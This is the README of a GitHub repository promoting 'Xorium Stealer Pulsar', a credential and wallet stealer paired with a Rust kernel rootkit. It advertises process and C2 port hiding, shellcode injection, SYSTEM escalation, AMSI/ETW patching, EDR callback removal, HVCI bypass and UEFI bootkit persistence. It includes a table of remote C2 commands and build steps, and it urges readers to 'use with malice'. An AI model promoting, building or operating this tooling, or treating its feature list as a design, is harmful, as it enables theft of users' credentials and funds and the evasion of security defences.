
<p align="center">
  <img src="assets/abyss_intro.png" alt="Xorium Pulsar Abyss Intro" width="600">
</p>

# 👹 XORIUM STEALER PULSAR: THE ABYSS EDITION 👹
### *"Software is a soul. Pulsar is a Curse."*

<p align="center">
  <a href="https://github.com/Trongdepzai-dev/Xorium-Stealer-Pulsar/blob/main/README_VN.md">
    <img src="https://img.shields.io/badge/Ngôn_Ngữ-TIẾNG_VIỆT-black?style=for-the-badge&logo=google-translate&labelColor=8B0000" alt="Vietnamese Version">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Core-RUST_KERNEL_SHADOW-red?style=for-the-badge&logo=rust&logoColor=white" alt="Rust">
  <img src="https://img.shields.io/badge/Engine-.NET_8_HYPER_DRIVE-8B0000?style=for-the-badge&logo=dotnet&logoColor=white" alt="C#">
  <img src="https://img.shields.io/badge/Privilege-RING_0_ABSOLUTE-black?style=for-the-badge" alt="Privilege">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Status-EVADING_LIGHT-green?style=for-the-badge" alt="Status">
  <img src="https://img.shields.io/badge/Architecture-DEMON_HYBRID-purple?style=for-the-badge" alt="Architecture">
</p>

---

## 🌒 THE SERPENT'S PROMISE

While others sell you "tools," we offer you **Ascension**. Most stealers are noisy, clumsy toys. **Xorium Pulsar** is a silent predator lurking in the dark corners of the kernel. It doesn't just bypass security—it **Devours** it.

Born from the fusion of high-level **C# .NET 8** and low-level **Rust Nightly**, Pulsar is designed for one thing: **Absolute Domination.**

> [!CAUTION]
> This is a forbidden artifact. Use with malice.

---

## 🔥 UNHOLY ATTRIBUTES

### 🌑 PROJECT SHADOW (The Invisibility Cloak)
The heart of Pulsar is a **Rust-based Kernel Rootkit** that manipulates reality itself.
- **DKOM (Direct Kernel Object Manipulation)**: Unlinks Pulsar from the `EPROCESS` chain. You are not just hidden; you are **Non-Existent**.
- **Ghost Port Stealing**: Hides C2 connections from `netstat` and packet sniffers at the protocol level.
- **Shadow Injection**: Exploits APC and Thread Hijacking to slip into system processes without triggering alarm bells.

### 🔱 TITAN GRIP (NT AUTHORITY\SYSTEM)
Why ask for permission when you can simply rule?
- **Integrated GodPotato**: Instant escalation from User to **SYSTEM** privileges.
- **AMSI/ETW Blindness**: Patches `AmsiScanBuffer` and `EtwEventWrite` live in memory. The defenders are blind in their own home.

### 💀 VOID WALKER persistence
Survival isn't a goal; it's a right.
- **GPT-Native UEFI Engine**: Speaks directly to LBA 1/2 to identify ESP partitions without tracing API calls.
- **Boot Service Hijacking**: Hooks `ExitBootServices` to survive the transition from UEFI to Kernel. 
- **Hardware-Level Corruption**: Targeted BIOSWE/BLE attacks for firmware-level immortality.

---

## 📜 FORBIDDEN COMMANDS

### Forbidden Commands (C2-Operational)
| Sign | Force | Effect | Parameters |
| :--- | :--- | :--- | :--- |
| `collect` | **Scraper** | Scans 150+ targets (Browsers, Wallets, etc.) | N/A |
| `shadow_fullstealth`| **Ritual** | Process + Driver + ETW Cloaking (All-in-one). | N/A |
| `shadow_ghost` | **Ritual** | Elevate to SYSTEM + Hide process. | N/A |
| `shadow_nuke_edr` | **Cataclysm**| Best-effort wipe of all EDR callbacks + ETW. | N/A |
| `shadow_hide_c2port`| **Net** | Hides connection from netstat/viewers. | `port` |
| `shadow_inject_apc` | **Infect** | Stealth shellcode injection via APC. | `pid\|path` |
| `shadow_inject_hijack`| **Infect** | Elite thread-hijacking injection. | `pid\|path` |
| `shadow_bypass_hvci` | **Bypass** | Disables Hypervisor Code Integrity. | N/A |
| `shadow_uefi_persist`| **Curse** | Installs persistent UEFI bootkit. | N/A |
| `kernel_hide_port` | **Kernel** | Low-level TCP/UDP port stealth. | `proto\|port` |
| `kernel_clean_callbacks`| **Kernel** | Simplified mass-removal of Process/Thread/Image. | N/A |
| `kernel_ghost_reg` | **Kernel** | Ghosts registry keys/values from all viewers. | `key\|value` |
| `kernel_hide_thread` | **Kernel** | Unlinks specific threads from visibility. | `tid` |
| `kernel_hide_module` | **Kernel** | Hides DLLs within a target process. | `pid\|modName` |
| `kernel_terminate` | **Kernel** | Unstoppable kernel-level process termination. | `pid` |
| `kernel_block_driver` | **Kernel** | Prevents specific drivers from loading. | `driverName` |
| `kernel_protect_reg_key`| **Shield** | Locks registry key against modification. | `keyPath` |
| `kernel_protect_reg_val`| **Shield** | Locks registry value against modification. | `key\|value` |
| `kernel_hvci_bypass` | **Bypass** | (Raw) Trigger HVCI bypass attempt. | N/A |
| `kernel_uefi_persist`| **Curse** | (Raw) Trigger UEFI persistence attempt. | N/A |
| `kernel_antivm` | **Shield** | Triggers deep kernel Anti-VM/Sandbox check. | N/A |

> [!TIP]
> **Manual Rituals**: Commands like `kernel_protect_process` and `kernel_signature_process` are fully implemented in the Hardware Driver and ShadowWrapper, but require manual invocation or C2 mapping updates to be used via the remote dispatcher.

---

---

## 🛠️ THE FORGE (Universal Build Engine)

We have optimized the build engine to be as ruthless as the malware itself. No more manual config. No more weakness.

### 🌀 Smart Build Infrastructure
Our unified scripts detect your environment and adapt instantly.

- **Windows Build** (`.\build.ps1`):
  - **WDK-Aware**: Automatically detects Windows Driver Kit. Skips if missing, builds if present.
  - **Nightly Enforcement**: Forces Rust Nightly for the most aggressive optimizations.
  - **.NET 8 Power**: Compiles the plugin with the latest high-performance runtime.

- **Linux/WSL Build** (`./build.sh`):
  - Full parity with Windows scripts.
  - Cross-compilation support for the dark arts.

```powershell
# Summon the binary
.\build.ps1
```

---

## 🕯️ THE DARK PATH (Roadmap)

- [x] **Ring 0 Rootkit**: Rust Kernel Driver mastery.
- [x] **.NET 8 Migration**: Maximum execution speed.
- [x] **Smart Build Engine**: Zero-manual dependency orchestration.
- [/] **Git Integration**: Secure, versioned evolution.
- [ ] **HVCI Bypass**: Piercing the hypervisor code integrity.
- [ ] **UEFI Bootkit**: Persistence that outlives the hardware itself.

---

## ⚠️ SACRIFICIAL WARNING
*This is a professional cyber-weapon. The developer takes no responsibility for the damage you cause. If you're going to use it... **Be a God among men.***

---

<p align="center">
  <b>[ 🩸 STAR THE REPO IF YOU DARE ]</b><br>
  <i>Evolve. Dominate. Xorium.</i>
</p>
